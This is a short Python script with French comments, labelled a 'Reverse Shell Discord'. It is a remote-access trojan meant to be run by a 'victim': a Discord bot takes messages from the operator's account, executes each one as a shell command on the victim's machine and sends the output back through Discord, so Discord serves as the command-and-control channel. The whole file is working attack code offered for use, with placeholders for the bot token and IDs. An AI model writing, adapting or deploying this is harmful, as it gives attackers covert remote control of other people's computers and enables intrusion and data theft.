# -*- coding: utf-8 -*-

from subprocess import check_output
import discord
from discord.ext import commands


# Reverse Shell Discord 

ton_id = 1234567890
ton_token = "TOKEN"


# Pour être averti quand la victime éxécute le fichier

salon_id = 1234567890

# Voulez-vous que le bot envoie un message quand il y a une erreur, ou qu'il l'ignore?

ignore = False


# Voulez-vous qu'il ne prenne en compte que les messages venant de vous ?

private = True


bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    for guild in bot.guilds:
        for channel in guild.channels:
            if channel.id == salon_id:
                try:
                    channel.send("Je suis là!")
                except:
                    pass
                return

@bot.listen()
async def on_message(mess):
    if private:
        if mess.author.id != ton_id:
            return
    try:
        output = check_output(mess.content, shell=True)
        if output.decode("cp850") in ["", None]:
            await mess.reply(content="Oke")

        else:   
            await mess.reply(content=output.decode("cp850"))
    except:
        if ignore == False:
            await mess.reply(content="Erreur bg")

    





bot.run(ton_token)
